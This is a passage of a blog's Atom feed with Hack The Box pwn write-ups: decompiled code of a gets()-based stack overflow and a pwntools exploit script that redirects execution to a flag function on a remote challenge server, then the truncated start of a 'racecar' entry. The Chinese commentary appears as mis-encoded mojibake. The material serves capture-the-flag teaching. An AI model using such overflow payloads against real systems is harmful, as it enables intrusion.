class=&#34;line&#34;&gt;crtstuff.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;deregister_tm_clones&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__do_global_dtors_aux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;completed.6887&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__do_global_dtors_aux_fini_array_entry&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame_dummy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__frame_dummy_init_array_entry&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__FRAME_END__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init_array_end&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_DYNAMIC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init_array_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__GNU_EH_FRAME_HDR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_GLOBAL_OFFSET_TABLE_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_csu_fini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__x86.get_pc_thunk.bx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printf@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__x86.get_pc_thunk.bp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgets@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_edata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getegid@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__data_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__gmon_start__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exit@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__dso_handle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_stdin_used&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_start_main@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setvbuf@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fopen@@GLIBC_2.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_dl_relocate_static_pie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_fp_hw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdout@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__bss_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__TMC_END__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setresgid@@GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.symtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.strtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.shstrtab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.interp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.note.gnu.build-id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.note.ABI-tag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynsym&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynstr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.gnu.version_r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rel.dyn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rel.plt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.fini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.rodata&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.eh_frame_hdr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.eh_frame&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init_array&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.fini_array&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.dynamic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.got&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.got.plt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.comment&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªæˆ‘ä»¬éœ€è¦çš„ flag&lt;/p&gt;
&lt;p&gt;ç›´æ¥æ‹–å…¥ ida32 æŸ¥çœ‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __gid_t v4; // [esp+0h] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(stdout, 0, 2, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = getegid();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setresgid(v4, v4, v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(&amp;quot;You know who are 0xDiablos: &amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vuln();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è°ƒç”¨äº† vuln å‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int vuln()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char s[180]; // [esp+0h] [ebp-B8h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  gets(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return puts(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰ä¸€ä¸ªå±é™©å‡½æ•° getsï¼Œs åˆ†é…äº† 180 çš„å†…å­˜ç©ºé—´&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;char *__cdecl flag(int a1, int a2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char *result; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  FILE *stream; // [esp+4Ch] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  stream = fopen(&amp;quot;flag.txt&amp;quot;, &amp;quot;r&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( !stream )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&amp;quot;Hurry up and try in on server side.&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exit(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = fgets(s, 64, stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( a1 == -559038737 &amp;amp;&amp;amp; a2 == -1059139571 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return (char *)printf(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ª flag å‡½æ•°ä½¿ç”¨äº† fopen è¯»å–äº†å†…å®¹å‚¨å­˜åˆ°äº† stream ä¸Šï¼Œæˆ‘ä»¬ç°åœ¨åªéœ€è¦è®©&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a1 == -559038737ä»¥åŠ a2 == -1059139571&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å°±èƒ½å¾—åˆ° flag&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹æ±‡ç¼–ç å¾—åˆ°&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:08049243 ; 13:   if ( a1 == -559038737 &amp;amp;&amp;amp; a2 == -1059139571 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08049243                 add     esp, 10h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08049246                 cmp     [ebp+arg_0], 0DEADBEEFh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0804924D                 jnz     short loc_8049269&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0804924F                 cmp     [ebp+arg_4], 0C0DED00Dh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08049256                 jnz     short loc_804926C&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯æ¯”è¾ƒ 0xDEADBEEF å’Œ 0xC0DED00D é‚£ç›´æ¥æ„é€  exp&lt;/p&gt;
&lt;h4 id=&#34;exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*188+p32(0x80491E2)+p32(0)+p32(0xDEADBEEF)+p32(0xC0DED00D)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;quot;188.166.175.58&amp;quot;,32705)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;quot;Diablos:&amp;quot;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
        <category term="PWN" />
        <updated>2023-12-13T10:51:43.000Z</updated>
    </entry>
    <entry>
        <id>https://lookhui.github.io/HTB-racecar-md/</id>
        <title>HTB-racecar</title>
        <link rel="alternate" href="https://lookhui.github.io/HTB-racecar-md/"/>
        <content type="html">&lt;h1 id=&#34;htb-racecar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htb-racecar&#34;&gt;#&lt;/a&gt; HTB-racecar&lt;/h1&gt;
&lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ä¿æŠ¤å…¨å¼€&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ strings æŸ¥çœ‹ä¸€ä¸‹å­—æ®µ&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span 